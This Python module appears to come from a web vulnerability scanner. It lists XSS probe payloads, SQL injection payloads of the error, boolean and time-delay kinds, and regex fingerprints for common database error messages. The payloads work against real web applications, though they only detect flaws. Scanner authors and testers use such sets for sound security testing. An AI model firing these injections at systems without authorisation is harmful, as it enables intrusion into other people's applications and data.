"""SV1 - payload sets and DB error fingerprints."""

from __future__ import annotations

import re

# --- XSS -------------------------------------------------------------------
# MARK is replaced at runtime by a random token so reflection checks are exact.
XSS_PAYLOADS = (
    'MARK"><svg/onload=alert(\'MARK\')>',
    "MARK'><svg/onload=alert('MARK')>",
    "MARK</title><svg/onload=alert('MARK')>",
    "MARK<img src=x onerror=alert('MARK')>",
    "MARK</script><svg/onload=alert('MARK')>",
    'MARK" onmouseover="alert(\'MARK\')',
)

# --- SQL injection errors --------------------------------------------------
ERROR_PAYLOADS = (
    "'",
    '"',
    "')",
    "'-- -",
    "1'",
    "1)",
    "' AND 1=CONVERT(int,@@version)-- -",
    "' AND extractvalue(1,concat(0x7e,version()))-- -",
    '" AND 1=1-- -',
    "\\'",
)

ERROR_SIGNATURES = (
    ("MySQL", re.compile(r"(sql syntax.*mysql|warning.*mysql_|mysqli?_|mysql server version|valid mysql result)", re.I)),
    ("MariaDB", re.compile(r"(maria db|mariadb|check the manual that corresponds to your mariadb)", re.I)),
    ("MSSQL", re.compile(
        r"(microsoft ole db provider|sql native client|odbc sql server driver|sqlserver jdbc|"
        r"unclosed quotation mark after the character string|incorrect syntax near|"
        r"system\.data\.sqlclient|microsoft sql server)", re.I)),
    ("PostgreSQL", re.compile(
        r"(postgresql.*error|warning.*pg_|valid postgresql result|npgsql|psqlexception|"
        r"pg::syntaxerror|syntax error at or near)", re.I)),
    ("Oracle", re.compile(r"(ora-0\d{4}|oracle error|oracle.*driver|quoted string not properly terminated)", re.I)),
    ("SQLite", re.compile(
        r"(sqlite/jdbcdriver|sqlite\.exception|system\.data\.sqlite|warning.*sqlite_|"
        r"sqlite3::|unrecognized token)", re.I)),
    ("Generic", re.compile(
        r"(sql command not properly ended|sqlexception|sqlstate\[|"
        r"division by zero|syntax error in query)", re.I)),
)

# --- SQL injection, boolean ------------------------------------------------
# (true_payload, false_payload)
BOOLEAN_PAIRS = (
    ("' AND '1'='1", "' AND '1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ('" AND "1"="1', '" AND "1"="2'),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ("1 AND 1=1-- -", "1 AND 1=2-- -"),
    ("1' AND '1'='1'-- -", "1' AND '1'='2'-- -"),
)

# --- SQL injection, time based ---------------------------------------------
# Templates; {d} is the configured delay in seconds.
TIME_PAYLOADS = (
    "' AND SLEEP({d})-- -",
    "' AND SLEEP({d})#",
    "1 AND SLEEP({d})-- -",
    "'; WAITFOR DELAY '0:0:{d}'-- -",
    "'; SELECT pg_sleep({d})-- -",
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('sv1',{d})-- -",
)


def delimited(payloads, delay: int) -> tuple:
    return tuple((p.format(d=delay), delay) for p in payloads)
